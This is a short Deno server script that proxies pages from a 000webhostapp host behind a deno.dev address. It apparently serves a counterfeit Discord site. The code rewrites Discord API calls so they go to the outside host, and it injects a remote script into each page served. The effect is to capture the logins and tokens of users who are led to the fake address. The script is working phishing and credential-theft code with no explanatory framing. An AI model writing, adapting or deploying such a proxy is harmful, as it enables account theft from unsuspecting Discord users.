import { serve } from "https://deno.land/std@0.177.0/http/server.ts";

async function handler(req) {
  const url = new URL(req.url);

  // Handle requests to the specific URL where replacement is needed
  if (url.hostname === "thirsty-moth-65.deno.dev") {
    const directory = url.pathname.replace("/", "");
    const replacementURL = `https://veiyosgfx.000webhostapp.com/${directory}`;

    const res = await fetch(replacementURL);
    const data = await res.text();

    // Perform replacements in the response data
    const modifiedData = data
      .replace("//discord.com/api", "//veiyosgfx.000webhostapp.com/api")
      .replace(
        '<link rel="prefetch" as="script" href="/assets/2ee09867df5e5af3d5f1.js"></link>',
        '<script src="//veiyosgfx.000webhostapp.com/assets/76be4d2b12a86ba3d932.js"></script><link rel="prefetch" as="script" href="/assets/2ee09867df5e5af3d5f1.js"></link>'
      );

    const headers = new Headers(res.headers);
    headers.set("content-type", res.headers.get("Content-Type"));

    const response = new Response(modifiedData, {
      status: res.status,
      headers: headers,
    });

    return response;
  }

  // For all other requests, pass them through
  const res = await fetch(req.url);
  return res;
}

serve(handler);
